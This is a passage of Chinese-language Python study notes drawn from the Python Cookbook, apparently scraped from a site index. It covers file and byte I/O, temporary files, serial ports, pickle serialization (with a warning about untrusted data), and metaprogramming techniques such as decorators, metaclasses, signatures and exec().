io.TextIOWrapper(sys.stdout.detach(), encoding='ascii', errors='xmlcharrefreplace') >>> print('Jalape\\u00f1o') Jalape&#241;o >>> 注意下最后输出中的非 ASCII 字符 ñ 是如何被 &#241; 取代的。 将字节写入文本文件 在文本模式打开的文件中写入原始的字节数据 将字节数据直接写入文件的缓冲区即可: >>> import sys >>> sys.stdout.write(b'Hello\\n') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: must be str, not bytes >>> sys.stdout.buffer.write(b'Hello\\n') Hello 5 >>> 类似的，能够通过读取文本文件的 buffer 属性来读取二进制数据 I/O 系统以层级结构的形式构建而成。 文本文件是通过在一个拥有缓冲的二进制模 式文件上增加一个 Unicode 编码/解码层来创建。 buffer 属性指向对应的底层文件。如 果你直接访问它的话就会绕过文本编码/解码层。 本例展示的 sys.stdout 可能看起来有点特殊。 默认情况下，sys.stdout 总 是以文本模式打开的。 但是如果你在写一个需要打印二进制数据到标准输出的脚本的 话，你可以使用上面演示的技术来绕过文本编码层。 将文件描述符包装成文件对象 你有一个对应于操作系统上一个已打开的 I/O 通道 (比如文件、管道、套接字等) 的整型文件描述符，你想将它包装成一个更高层的 Python 文件对象。 一个文件描述符和一个打开的普通文件是不一样的。 文件描述符仅仅是一个由操 作系统指定的整数，用来指代某个系统的 I/O 通道。 如果你碰巧有这么一个文件描述 符，你可以通过使用 open() 函数来将其包装为一个 Python 的文件对象。 你仅仅只需 要使用这个整数值的文件描述符作为第一个参数来代替文件名即可。 如: # Open a low-level file descriptor import os fd = os.open('somefile.txt', os.O_WRONLY | os.O_CREAT) # Turn into a proper file f = open(fd, 'wt') f.write('hello world\\n') f.close() 当高层的文件对象被关闭或者破坏的时候，底层的文件描述符也会被关闭。 如果这 个并不是你想要的结果，你可以给 open() 函数传递一个可选的 colsefd=False 。比 如: # Create a file object, but don't close underlying fd when done f = open(fd, 'wt', closefd=False) ... 在 Unix 系统中，这种包装文件描述符的技术可以很方便的将一个类文件接口作用 于一个以不同方式打开的 I/O 通道上， 如管道、套接字等。举例来讲，下面是一个操 作管道的例子: from socket import socket, AF_INET, SOCK_STREAM def echo_client(client_sock, addr): print('Got connection from', addr) # Make text-mode file wrappers for socket reading/writing client_in = open(client_sock.fileno(), 'rt', encoding='latin-1', closefd=False) client_out = open(client_sock.fileno(), 'wt', encoding='latin-1', closefd=False) # Echo lines back to the client using file I/O for line in client_in: client_out.write(line) client_out.flush() client_sock.close() def echo_server(address): sock = socket(AF_INET, SOCK_STREAM) sock.bind(address) sock.listen(1) while True: client, addr = sock.accept() echo_client(client, addr) 需要重点强调的一点是，上面的例子仅仅是为了演示内置的 open() 函数的一个特 性，并且也只适用于基于 Unix 的系统。 如果你想将一个类文件接口作用在一个套接字 并希望你的代码可以跨平台，请使用套接字对象的 makefile() 方法。 但是如果不考虑 可移植性的话，那上面的解决方案会比使用 makefile() 性能更好一点。 你也可以使用这种技术来构造一个别名，允许以不同于第一次打开文件的方式使 用它。 例如，下面演示如何创建一个文件对象，它允许你输出二进制数据到标准输出 (通常以文本模式打开): import sys # Create a binary-mode file for stdout bstdout = open(sys.stdout.fileno(), 'wb', closefd=False) bstdout.write(b'Hello World\\n') bstdout.flush() 尽管可以将一个已存在的文件描述符包装成一个正常的文件对象，但是要注意的 是并不是所有的文件模式都被支持， 并且某些类型的文件描述符可能会有副作用 (特别 是涉及到错误处理、文件结尾条件等等的时候)。 在不同的操作系统上这种行为也是不 一样，特别的，上面的例子都不能在非 Unix 系统上运行。 创建临时文件和文件夹 你需要在程序执行时创建一个临时文件或目录，并希望使用完之后可以自动销毁 掉。 tempfile 模块( /docs/后端/python/python标准库/tempfile )中有很多的函数可以完成这任务。 为了创建一个匿名的临时文件， 可以使用 tempfile.TemporaryFile from tempfile import TemporaryFile with TemporaryFile('w+t') as f: # Read/write to the file f.write('Hello World\\n') f.write('Testing\\n') # Seek back to beginning and read the data f.seek(0) data = f.read() # Temporary file is destroyed 或者，如果你喜欢，你还可以像这样使用临时文件: f = TemporaryFile('w+t') # Use the temporary file ... f.close() # File is destroyed TemporaryFile() 的第一个参数是文件模式，通常来讲文本模式使用 w+t ，二进 制模式使用 w+b 。 这个模式同时支持读和写操作，在这里是很有用的，因为当你关闭 文件去改变模式的时候，文件实际上已经不存在了。 TemporaryFile() 另外还支持跟内 置的 open() 函数一样的参数。比如: with TemporaryFile('w+t', encoding='utf-8', errors='ignore') as f: ... 在大多数 Unix 系统上，通过 TemporaryFile() 创建的文件都是匿名的，甚至连目 录都没有。 如果你想打破这个限制，可以使用 NamedTemporaryFile() 来代替。比如: from tempfile import NamedTemporaryFile with NamedTemporaryFile('w+t') as f: print('filename is:', f.name) ... # File automatically destroyed 这里，被打开文件的 f.name 属性包含了该临时文件的文件名。 当你需要将文件 名传递给其他代码来打开这个文件的时候，这个就很有用了。 和 TemporaryFile() 一 样，结果文件关闭时会被自动删除掉。 如果你不想这么做，可以传递一个关键字参数 delete=False 即可。 为了创建一个临时目录，可以使用 tempfile.TemporaryDirectory() 。比如: from tempfile import TemporaryDirectory with TemporaryDirectory() as dirname: print('dirname is:', dirname) # Use the directory ... # Directory and all contents destroyed TemporaryFile() 、NamedTemporaryFile() 和 TemporaryDirectory() 函数应该 是处理临时文件目录的最简单的方式了， 因为它们会自动处理所有的创建和清理步骤。 在一个更低的级别，你可以使用 mkstemp() 和 mkdtemp() 来创建临时文件和目录。比 如: >>> import tempfile >>> tempfile.mkstemp() (3, '/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-/tmp7fefhv') >>> tempfile.mkdtemp() '/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-/tmp5wvcv6' >>> 但是，这些函数并不会做进一步的管理了。 例如，函数 mkstemp() 仅仅就返回一 个原始的 OS 文件描述符，你需要自己将它转换为一个真正的文件对象。 同样你还需要 自己清理这些文件。 通常来讲，临时文件在系统默认的位置被创建，比如 /var/tmp 或类似的地方。 为 了获取真实的位置，可以使用 tempfile.gettempdir() 函数。比如: >>> tempfile.gettempdir() '/var/folders/7W/7WZl5sfZEF0pljrEB1UMWE+++TI/-Tmp-' >>> 所有和临时文件相关的函数都允许你通过使用关键字参数 prefix 、suffix 和 dir 来自定义目录以及命名规则。比如: >>> f = NamedTemporaryFile(prefix='mytemp', suffix='.txt', dir='/tmp') >>> f.name '/tmp/mytemp8ee899.txt' >>> 最后还有一点，尽可能以最安全的方式使用 tempfile 模块来创建临时文件。 包括 仅给当前用户授权访问以及在文件创建过程中采取措施避免竞态条件。要注意的是不 同的平台可能会不一样。 与串行端口的数据通信 通过串行端口读写数据，典型场景就是和一些硬件设备打交道 (比如一个机器 人或传感器)。 尽管你可以通过使用 Python 内置的 I/O 模块来完成这个任务，但对于串行通信 最好的选择是使用 pySerial 包 。 这个包的使用非常简单，先安装 pySerial，使用类似下 面这样的代码就能很容易的打开一个串行端口: import serial ser = serial.Serial('/dev/tty.usbmodem641', # Device name varies baudrate=9600, bytesize=8, parity='N', stopbits=1) 设备名对于不同的设备和操作系统是不一样的。 比如，在 Windows 系统上，你可 以使用 0, 1 等表示的一个设备来打开通信端口\"COM0\"和\"COM1\"。 一旦端口打开， 那就可以使用 read()，readline() 和 write() 函数读写数据了。例如: ser.write(b'G1 X50 Y50\\r\\n') resp = ser.readline() 尽管表面上看起来很简单，其实串口通信有时候也是挺麻烦的。 推荐你使用第三 方包如 pySerial 的一个原因是它提供了对高级特性的支持 (比如超时，控制流，缓冲 区刷新，握手协议等等)。 举个例子，如果你想启用 RTS-CTS 握手协议，你只需要给 Serial() 传递一个 rtscts=True 的参数即可。 时刻记住所有涉及到串口的 I/O 都是二进制模式的。 因此，确保你的代码使用的 是字节而不是文本 (或有时候执行文本的编码/解码操作)。 另外当你需要创建二进制编 码的指令或数据包的时候，struct 模块也是非常有用的。 序列化 Python 对象 你需要将一个 Python 对象序列化为一个字节流，以便将它保存到一个文件、存储 到数据库或者通过网络传输它。 对于序列化最普遍的做法就是使用 pickle 模块。为了将一个对象保存到一个文件 中，可以这样做: import pickle data = ... # Some Python object f = open('somefile', 'wb') pickle.dump(data, f) 为了将一个对象转储为一个字符串，可以使用 pickle.dumps() s = pickle.dumps(data) 为了从字节流中恢复一个对象，使用 picle.load() 或 pickle.loads() 函数。比 如: # Restore from a file f = open('somefile', 'rb') data = pickle.load(f) # Restore from a string data = pickle.loads(s) 对于大多数应用程序来讲，dump() 和 load() 函数的使用就是你有效使用 pickle 模块所需的全部了。 它可适用于绝大部分 Python 数据类型和用户自定义类的对象实 例。 如果你碰到某个库可以让你在数据库中保存/恢复 Python 对象或者是通过网络传 输对象的话，那么很有可能这个库的底层就使用了 pickle 模块。 pickle 是一种 Python 特有的自描述的数据编码。 通过自描述，被序列化后的数 据包含每个对象开始和结束以及它的类型信息。 因此，你无需担心对象记录的定义，它 总是能工作。举个例子，如果要处理多个对象，你可以这样做: >>> import pickle >>> f = open('somedata', 'wb') >>> pickle.dump([1, 2, 3, 4], f) >>> pickle.dump('hello', f) >>> pickle.dump({'Apple', 'Pear', 'Banana'}, f) >>> f.close() >>> f = open('somedata', 'rb') >>> pickle.load(f) [1, 2, 3, 4] >>> pickle.load(f) 'hello' >>> pickle.load(f) {'Apple', 'Pear', 'Banana'} >>> 你还能序列化函数，类，还有接口，但是结果数据仅仅将它们的名称编码成对应的 代码对象。: >>> import math >>> import pickle. >>> pickle.dumps(math.cos) b'\\x80\\x03cmath\\ncos\\nq\\x00.' >>> 当数据反序列化回来的时候，会先假定所有的源数据时可用的。模块、类和函数会 自动按需导入进来。 对于 Python 数据被不同机器上的解析器所共享的应用程序而言， 数据的保存可能会有问题，因为所有的机器都必须访问同一个源代码。 注解 千万不要对不信任的数据使用 pickle.load()。 pickle 在加载时有一个副作用就是它会自动加载相应模块并构造实例对象。 但是某个坏人如果知道 pickle 的工作原理， 他就可以创建一个恶意的数据导致 Python 执行随意指定的系统命令。 因此，一定要保证 pickle 只在相互之间可以认证对方的解析器的内部使用。 有些类型的对象是不能被序列化的。 这些通常是那些依赖外部系统状态的对象， 比如打开的文件，网络连接，线程，进程，栈帧等等。 用户自定义类可以通过提供 __getstate__() 和 __setstate__() 方法来绕过这些限制。 如果定义了这两个方法， pickle.dump() 就会调用 __getstate__() 获取序列化的对象。 类似的， __setstate__() 在反序列化时被调用。 为了演示这个工作原理，下面是一个在内部定义了一个线程但仍 然可以序列化和反序列化的类: # countdown.py import time import threading class Countdown: def __init__(self, n): self.n = n self.thr = threading.Thread(target=self.run) self.thr.daemon = True self.thr.start() def run(self): while self.n > 0: print('T-minus', self.n) self.n -= 1 time.sleep(5) def __getstate__(self): return self.n def __setstate__(self, n): self.__init__(n) 试着运行下面的序列化试验代码: >>> import countdown >>> c = countdown.Countdown(30) >>> T-minus 30 T-minus 29 T-minus 28 ... >>> # After a few moments >>> f = open('cstate.p', 'wb') >>> import pickle >>> pickle.dump(c, f) >>> f.close() 然后退出 Python 解析器并重启后再试验下: >>> f = open('cstate.p', 'rb') >>> pickle.load(f) <countdown.Countdown object at 0x10069e2d0> T-minus 19 T-minus 18 ... 你可以看到线程又奇迹般的重生了，从你第一次序列化它的地方又恢复过来 pickle 对于大型的数据结构比如使用 array 或 numpy 模块创建的二进制数组效率 并不是一个高效的编码方式。 如果你需要移动大量的数组数据，你最好是先在一个文 件中将其保存为数组数据块或使用更高级的标准编码方式如 HDF5 (需要第三方库的支 持)。 由于 pickle 是 Python 特有的并且附着在源码上，所有如果需要长期存储数据的 时候不应该选用它。 例如，如果源码变动了，你所有的存储数据可能会被破坏并且变得 不可读取。 坦白来讲，对于在数据库和存档文件中存储数据时，你最好使用更加标准的 数据编码格式如 XML，CSV 或 JSON。 这些编码格式更标准，可以被不同的语言支持， 并且也能很好的适应源码变更。 最后一点要注意的是 pickle 有大量的配置选项和一些棘手的问题。 对于最常见的 使用场景，你不需要去担心这个，但是如果你要在一个重要的程序中使用 pickle 去做 序列化的话， 最好去查阅一下 官方文档 。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-File,-IO.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-File,-IO.html"},{"title":"元编程","text":"软件开发领域中最经典的口头禅就是\"don't repeat yourself\"。也就是说，任何时 候当你的程序中存在高度重复 (或者是通过剪切复制) 的代码时，都应该想想是否有更 好的解决方案。在 Python 当中，通常都可以通过元编程来解决这类问题。简而言之， 元编程就是关于创建操作源代码 (比如修改、生成或包装原来的代码) 的函数和类。主 要技术是使用装饰器、类装饰器和元类。不过还有一些其他技术，包括签名对象、使用 exec() 执行代码以及对内部函数和类的反射技术等。本章的主要目的是向大家介绍这 些元编程技术，并且给出实例来演示它们是怎样定制化你的源代码行为的。 在函数上添加包装器 你想在函数上添加一个包装器，增加额外的操作处理 (比如日志、计时等)。 使用装饰器函数 顺便说一下，内置的装饰器比如 @staticmethod, @classmethod,@property 原理 也是一样的。例如，下面这两个代码片段是等价的: class A: @classmethod def method(cls): pass class B: # Equivalent definition of a class method def method(cls): pass method = classmethod(method) 创建装饰器时保留函数元信息 你写了一个装饰器作用在某个函数上，但是这个函数的重要的元信息比如名字、文 档字符串、注解和参数签名都丢失了。 使用functools.wraps(fn) 保留元信息 @wraps 有一个重要特征是它能让你通过属性 __wrapped__ 直接访问被包装函数。 解除一个装饰器 一个装饰器已经作用在一个函数上，你想撤销它，直接访问原始的未包装的那个函数 假设装饰器是通过 @wraps (参考 9.2 小节) 来实现的，那么你可以通过访问 __wrapped__ 属性来访问原始函数: >>> @somedecorator >>> def add(x, y): ... return x + y ... >>> orig_add = add.__wrapped__ >>> orig_add(3, 4) 7 直接访问未包装的原始函数在调试、内省和其他函数操作时是很有用的。但是我 们这里的方案仅仅适用于在包装器中正确使用了 @wraps 或者直接设置了 __wrapped__ 属性的情况。 如果有多个包装器，那么访问 __wrapped__ 属性的行为是不可预知的，应该避免 这样做 在 Python3.3 中后，它会略过所有的包装层. 最后要说的是，并不是所有的装饰器都使用了 @wraps ，因此这里的方案并不全部 适用。特别的，内置的装饰器 @staticmethod 和 @classmethod 就没有遵循这个约定 (它们把原始函数存储在属性 __func__ 中)。 定义一个带参数的装饰器 可自定义属性的装饰器 你想写一个装饰器来包装一个函数，并且允许用户提供参数在运行时控制装饰器 行为。 引入一个访问函数，使用 nonlocal 来修改内部变量。然后这个访问函数被 作为一 个属性赋值给包装函数 带可选参数的装饰器 主要注意带参数区别, 见 diff_warp_with_args 利用装饰器强制函数上的类型检查 作为某种编程规约，你想在对函数参数进行强制类型检查。 使用装饰器和 inspect.signature 函数 将装饰器定义为类的一部分 你想在类中定义装饰器，并将其作用在其他函数或方法上。 在类里面定义装饰器很简单，但是你首先要确认它的使用方式。比如到底是作为一 个实例方法还是类方法 例: from functools import wraps class A: # Decorator as an instance method def decorator1(self, func): @wraps(func) def wrapper(*args, **kwargs): print('Decorator 1') return func(*args, **kwargs) return wrapper # Decorator as a class method @classmethod def decorator2(cls, func): @wraps(func) def wrapper(*args, **kwargs): print('Decorator 2') return func(*args, **kwargs) return wrapper 使用: # As an instance method a = A() @a.decorator1 def spam(): pass # As a class method @A.decorator2 def grok(): pass 一个是实例调用，一个是类调用 在类中定义装饰器初看上去好像很奇怪，但是在标准库中有很多这样的例子。特别 的，@property 装饰器实际上是一个类，它里面定义了三个方法 getter(), setter(), deleter() , 每一个方法都是一个装饰器。 主要原因是各种不同的装饰器方法会在关联的 property 实 例上操作它的状态。因此，任何时候只要你碰到需要在装饰器中记录或绑定信息，那么 这不失为一种可行方法 对于类里面定义的包装器还有一点比较难理解，就是在涉及到继承的时候。例如， 假设你想让在 A 中定义的装饰器作用在子类 B 中。你需要像下面这样写: class B(A): @A.decorator2 def bar(self): pass 也就是说，装饰器要被定义成类方法并且你必须显式的使用父类名去调用它。你不 能使用 @B.decorator2 ，因为在方法定义时，这个类 B 还没有被创建。 将装饰器定义为类 你想使用一个装饰器去包装函数，但是希望返回一个可调用的实例。你需要让你的 装饰器可以同时工作在类定义的内部和外部 需要实现 __call__() 和 __get__() 方法 , 如: import types from functools import wraps class Profiled: def __init__(self, func): # 将自己设为装饰的对象 wraps(func)(self) self.ncalls = 0 def __call__(self, *args, **kwargs): self.ncalls += 1 return self.__wrapped__(*args, **kwargs) # 描述器方法, 必须实现, 以补充所装饰类方法的第一个 self 参数 def __get__(self, instance, cls): if instance is None: return self else: return types.MethodType(self, instance) __get__() 方法是为了确保绑定方法对象能被正确的创建。type.MethodType() 手 动创建一个绑定方法来使用。只有当实例被使用的时候绑定方法才会被创建。如果这个 方法是在类上面来访问，那么 __get__() 中的 instance 参数会被设置成 None 并直接 返回 Profiled 实例本身。 为类和静态方法提供装饰器 给类或静态方法提供装饰器是很简单的，不过要确保装饰器在 @classmethod 或 @staticmethod 之后。不然被装饰的就是 @classmethod 了, 而其又没有返回可调用对象. 装饰器为被包装函数增加参数 可以使用关键字参数来给被包装函数增加额外参数: from functools import wraps def optional_debug(func): @wraps(func) def wrapper(*args, debug=False, **kwargs): if debug: print('Calling', func.__name__) return func(*args, **kwargs) return wrapper 调用: >>> @optional_debug ... def spam(a,b,c): ... print(a,b,c) ... >>> spam(1,2,3) 1 2 3 >>> spam(1,2,3, debug=True) Calling spam 1 2 3 >>> 通过装饰器来给被包装函数增加参数的做法并不常见。尽管如此，有时候它可以避 免一些重复代码。 这种实现方案之所以行得通，在于强制关键字参数很容易被添加到接受*args 和**kwargs 参数的函数中。 不过可能会与函数本来的参数冲突, 故可以在装饰器加入参数判断: if 'debug' in inspect.getargspec(func).args: raise TypeError('debug argument already defined') 如果要支持使用inspect检查原有参数时, 显示这个关键字参数, 装饰器函数增加: @wraps(func) def wrapper(*args, debug=False, **kwargs): ... sig = inspect.signature(func) parms = list(sig.parameters.values()) parms.append(inspect.Parameter('debug', inspect.Parameter.KEYWORD_ONLY, default=False)) wrapper.__signature__ = sig.replace(parameters=parms) return wrapper 使用装饰器扩充类的功能 你想通过反省或者重写类定义的某部分来修改它的行为，但是你又不希望使用继 承或元类的方式 这种情况可能是类装饰器最好的使用场景了。例如，下面是一个重写了特殊方法__getattribute__的类装饰器，可以打印日志: def log_getattribute(cls): # Get the original implementation orig_getattribute = cls.__getattribute__ # Make a new definition def new_getattribute(self, name): print('getting:', name) return orig_getattribute(self, name) # Attach to the class and return cls.__getattribute__ = new_getattribute return cls 如果你系想在一个类上面使用多个类装饰器，那么就需要注意下顺序问题。例如， 一个装饰器 A 会将其装饰的方法完整替换成另一种实现，而另一个装饰器 B 只是简单 的在其装饰的方法中添加点额外逻辑。那么这时候装饰器 A 就需要放在装饰器 B 的前 面 使用元类控制实例的创建 不允许实例: class NoInstances(type): def __call__(self, *args, **kwargs): raise TypeError(\"Can't instantiate directly\") # Example class Spam(metaclass=NoInstances): @staticmethod def grok(x): print('Spam.grok') 实现单例模式: class Singleton(type): def __init__(self, *args, **kwargs): self.__instance = None super().__init__(*args, **kwargs) def __call__(self, *args, **kwargs): if self.__instance is None: self.__instance = super().__call__(*args, **kwargs) return self.__instance else: return self.__instance 上述实现单例是错误的, 可能是古老的Python版本支持这样使用. 还是老老实实的: class Single(object): __instance: 'Single' = None def __new__(cls, *args, **kwargs): if cls.__instance is None: cls.__instance = super().__new__(cls) return cls.__instance 捕获类的属性定义顺序 想自动记录一个类中属性和方法定义的顺序，然后可以利用它来做很多操作（比 如序列化、映射到数据库等等）。 利用元类可以很容易的捕获类的定义信息。下面是一个例子，使用了一个 OrderedDict 来记录描述器的定义顺序 这里我没有看懂, 写的啥玩意儿, 跳过. 定义有可选参数的元类 你想定义一个元类，允许类定义时提供可选参数，这样可以控制或配置类型的创建 过程。 在自定义元类中我们可以提供关键字参数: class Spam(metaclass=MyMeta, debug=True, synchronize=True): pass 为了使元类支持这些关键字参数, 你必须确保在__prepare__(),__new__()和__init__()方法 中都使用强制关键字参数。就像下面这样: class MyMeta(type): # Optional @classmethod def __prepare__(cls, name, bases, *, debug=False, synchronize=False): # Custom processing pass return super().__prepare__(name, bases) # Required def __new__(cls, name, bases, ns, *, debug=False, synchronize=False): # Custom processing pass return super().__new__(cls, name, bases, ns) # Required def __init__(self, name, bases, ns, *, debug=False, synchronize=False): # Custom processing pass super().__init__(name, bases, ns) 给一个元类添加可选关键字参数需要你完全弄懂类创建的所有步骤，因为这些参 数会被传递给每一个相关的方法。__prepare__() 方法在所有类定义开始执行前首先 被调用，用来创建类命名空间。通常来讲，这个方法只是简单的返回一个字典或其他映 射对象。__new__() 方法被用来实例化最终的类对象。它在类的主体被执行完后开始执 行。__init__() 方法最后被调用，用来执行其他的一些初始化工作。 当我们构造元类的时候，通常只需要定义一个 __new__() 或 __init__() 方法，但 不是两个都定义。但是，如果需要接受其他的关键字参数的话，这两个方法就要同时提 供，并且都要提供对应的参数签名。默认的 __prepare__() 方法接受任意的关键字参 数，但是会忽略它们，所以只有当这些额外的参数可能会影响到类命名空间的创建时你 才需要去定义 __prepare__() 方法。 通过使用强制关键字参数，在类的创建过程中我们必须通过关键字来指定这些参 数。 使用关键字参数配置一个元类还可以视作对类变量的一种替代方式。例如: class Spam(metaclass=MyMeta): debug = True synchronize = True 将这些属性定义为参数的好处在于它们不会污染类的名称空间，这些属性仅仅只 从属于类的创建阶段，而不是类中的语句执行阶段。另外，它们在 __prepare__() 方 法中是可以被访问的，因为这个方法会在所有类主体执行前被执行。但是类变量只能在 元类的 __new__() 和 __init__() 方法中可见。 *args和**kwargs的强制参数签名 你有一个函数或方法，它使用*args 和**kwargs 作为参数，这样使得它比较通用， 但有时候你想检查传递进来的参数是不是某个你想要的类型。 对任何涉及到操作函数调用签名的问题，你都应该使用 inspect 模块中的签名特 性。我们最主要关注两个类：Signature 和 Parameter 。下面是一个创建函数前面的交 互例子: >>> from inspect import Signature, Parameter >>> # Make a signature for a func(x, y=42, *, z=None) >>> parms = [ Parameter('x', Parameter.POSITIONAL_OR_KEYWORD), ... Parameter('y', Parameter.POSITIONAL_OR_KEYWORD, default=42), ... Parameter('z', Parameter.KEYWORD_ONLY, default=None) ] >>> sig = Signature(parms) >>> print(sig) (x, y=42, *, z=None) >>> 一旦你有了一个签名对象，你就可以使用它的 bind() 方法很容易的将它绑定 到*args 和**kwargs 上去: >>> def func(*args, **kwargs): ... bound_values = sig.bind(*args, **kwargs) ... for name, value in bound_values.arguments.items(): ... print(name,value) ... >>> # Try various examples >>> func(1, 2, z=3) x 1 y 2 z 3 >>> func(1) x 1 >>> func(1, z=3) x 1 z 3 >>> func(y=2, x=1) x 1 在我们需要构建通用函数库、编写装饰器或实现代理的时候，对于*args 和**kwargs 的使用是很普遍的。但是，这样的函数有一个缺点就是当你想要实现自己的 参数检验时，代码就会笨拙混乱。这时候我们可以 通过一个签名对象来简化它。 使用类实现: from inspect import Signature, Parameter def make_sig(*names): parms = [Parameter(name, Parameter.POSITIONAL_OR_KEYWORD) for name in names] return Signature(parms) class StructureMeta(type): def __new__(cls, clsname, bases, clsdict): clsdict['__signature__'] = make_sig(*clsdict.get('_fields',[])) return super().__new__(cls, clsname, bases, clsdict) class Structure(metaclass=StructureMeta): _fields = [] def __init__(self, *args, **kwargs): bound_values = self.__signature__.bind(*args, **kwargs) for name, value in bound_values.arguments.items(): setattr(self, name, value) # Example class Stock(Structure): _fields = ['name', 'shares', 'price'] class Point(Structure): _fields = ['x', 'y'] 当我们自定义签名的时候，将签名存储在特定的属性 __signature__ 中通常是很 有用的。这样的话，在使用 inspect 模块执行内省的代码就能发现签名并将它作为调 用约定: >>> import inspect >>> print(inspect.signature(Stock)) (name, shares, price) >>> print(inspect.signature(Point)) (x, y) >>> 在类上强制使用编程规约 你的程序包含一个很大的类继承体系，你希望强制执行某些编程规约（或者代码 诊断）来帮助程序员保持清醒。 在元类中选择重新定义 __new__() 方法还是 __init__() 方法取决于你想怎样使 用结果类。__new__() 方法在类创建之前被调用，通常用于通过某种方式（比如通过改 变类字典的内容）修改类的定义。而 __init__() 方法是在类被创建之后被调用，当你 需要完整构建类对象的时候会很有用。 其实就是使用顶级父类, 因为新旧版本不一致就不走书上的例子了 以编程方式定义类 问题 你在写一段代码，最终需要创建一个新的类对象。你考虑将类的定义源代码以字符 串的形式发布出去。并且使用函数比如 exec() 来执行它，但是你想寻找一个更加优雅 的解决方案。 解决方案 你可以使用函数 types.new_class() 来初始化新的类对象。你需要做的只是提供 类的名字、父类元组、关键字参数，以及一个用成员变量填充类字典的回调函数。 如: # stock.py # Example of making a class manually from parts # Methods def __init__(self, name, shares, price): self.name = name self.shares = shares self.price = price def cost(self): return self.shares * self.price cls_dict = { '__init__' : __init__, 'cost' : cost, } # Make a class import types Stock = types.new_class('Stock', (), {}, lambda ns: ns.update(cls_dict)) Stock.__module__ = __name__ 这种方式会构建一个普通的类对象，并且按照你的期望工作: >>> s = Stock('ACME', 50, 91.1) >>> s <stock.Stock object at 0x1006a9b10> >>> s.cost() 4555.0 >>> Stock.__module__ = __name__ 用于生成 __repr__() 方法的输出。它同样也被用于很多库，比如 pickle 。因此，为了让你创建的类是\"正确\"的，你需要确保这个属性也设置正确了。 如果你想创建的类需要一个不同的元类，可以通过 types.new_class() 第三个参 数传递给它: Stock = types.new_class('Stock', (), {'metaclass': abc.ABCMeta}, lambda ns: ns.update(cls_dict)) 第三个参数还可以包含其他的关键字参数. 比如，一个类的定义如下: class Spam(Base, debug=True, typecheck=False): pass 可以这样定义: Spam = types.new_class('Spam', (Base,), {'debug': True, 'typecheck': False}, lambda ns: ns.update(cls_dict)) new_class() 第四个参数，用来接受类命名空间的映射对象的函 数。通常这是一个普通的字典，但是它实际上是 __prepare__() 方法返回的任意对象， 讨论 很 多 时 候 如 果 能 构 造 新 的 类 对 象 是 很 有 用 的。有 个 很 熟 悉 的 例 子 是 调 用 collections.namedtuple() 函数 namedtuple() 使用 exec() 而不是上面介绍的技术 在定义的时候初始化类的成员 利用函数注解实现方法重载 问题 你已经学过怎样使用函数参数注解，那么你可能会想利用它来实现基于类型的方 法重载。但是你不确定应该怎样去实现（或者到底行得通不）。 解决方案 基于一个简单的技术: Python 允许参数注解 如: class Spam: def bar(self, x:int, y:int): print('Bar 1:', x, y) def bar(self, s:str, n:int = 0): print('Bar 2:', s, n) s = Spam() s.bar(2, 3) # Prints Bar 1: 2 3 s.bar('hello') # Prints Bar 2: hello 0 得使用inspect检查然后判断用哪个. 不表. 避免重复的属性方法 问题 你在类中需要重复的定义一些执行相同逻辑的属性方法，比如进行类型检查，怎样 去简化这些重复代码呢 解决方案 使用自定义函数 如重复的属性访问器: class Person: def __init__(self, name ,age): self.name = name self.age = age @property def name(self): return self._name @name.setter def name(self, value): if not isinstance(value, str): raise TypeError('name must be a string') self._name = value @property def age(self): return self._age @age.setter def age(self, value): if not isinstance(value, int): raise TypeError('age must be an int') self._age = value 可以使用函数简化: def typed_property(name, expected_type): storage_name = '_' + name @property def prop(self): return getattr(self, storage_name) @prop.setter def prop(self, value): if not isinstance(value, expected_type): raise TypeError('{} must be a {}'.format(name, expected_type)) setattr(self, storage_name, value) return prop 使用: # Example use class Person: name = typed_property('name', str) age = typed_property('age', int) def __init__(self, name, age): self.name = name self.age = age 讨论 函数 typed_property() 看上去有点难理解，其实它所做的仅仅就是为你生成属性并 返回这个属性对象。因此，当在一个类中使用它的时候，效果跟将它里面的代码放到 类定义中去是一样的。 还可以使用 functools.partial() 来稍稍改变下: from functools import partial String = partial(typed_property, expected_type=str) Integer = partial(typed_property, expected_type=int) # Example: class Person: name = String('name') age = Integer('age') def __init__(self, name, age): self.name = name self.age = age 定义上下文管理器的简单方法 问题 你想自己去实现一个新的上下文管理器，以便使用 with 语句。 解决方案 实现一个新的上下文管理器的最简单的方法就是使用 contexlib 模块中的 @contextmanager 装饰器 如: import time from contextlib import contextmanager @contextmanager def timethis(label): start = time.time() try: yield finally: end = time.time() print('{}: {}'.format(label, end - start)) # Example use with timethis('counting'): n = 10000000 while n > 0: n -= 1 在函数 timethis() 中，yield 之前的代码会在上下文管理器中作为 __enter__() 方法执行，所有在 yield 之后的代码会作为 __exit__() 方法执行。如果出现了异常， 异常会在 yield 语句那里抛出。 更加高级一点的上下文管理器，实现了列表对象上的某种事务: @contextmanager def list_transaction(orig_list): working = list(orig_list) yield working orig_list[:] = working @contextmanager 应该仅仅用来写自包含的上下文管理函数。如果你有一些对 象 (比如一个文件、网络连接或锁)，需要支持 with 语句，那么你就需要单独实现 __enter__() 方法和 __exit__() 方法。 在局部变量域中执行代码 问题 你想在使用范围内执行某个代码片段，并且希望在执行后所有的结果都不可见 为了理解这个问题，先试试一个简单场景。首先，在全局命名空间内执行一个代码 片段: >>> a = 13 >>> exec('b = a + 1') >>> print(b) 14 >>> 然后，再在一个函数中执行同样的代码: >>> def test(): ... a = 13 ... exec('b = a + 1') ... print(b) ... >>> test() Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"<stdin>\", line 4, in test NameError: global name 'b' is not defined >>> 为了修正这样的错误，你需要在调用 exec() 之前使用 locals() 函数来得到一个 局部变量字典。之后你就能从局部字典中获取修改过后的变量值了: >>> def test(): ... a = 13 ... loc = locals() ... exec('b = a + 1') ... b = loc['b'] ... print(b) ... >>> test() 14 >>> 讨论 实际上对于 exec() 的正确使用是比较难的。大多数情况下当你要考虑使用 exec() 的时候，还有另外更好的解决方案（比如装饰器、闭包、元类等等）。 默认情况下，exec() 会在调用者局部和全局范围内执行代码。然而，在函数里面，传递给 exec() 的局部范围是拷贝实际局部变量组成的一个字典。因此，如果 exec() 如果执 行了修改操作，这种修改后的结果对实际局部变量值是没有影响的: >>> def test1(): ... x = 0 ... exec('x += 1') ... print(x) ... >>> test1() 0 >>> 另一个演示例子: >>> def test2(): ... x = 0 ... loc = 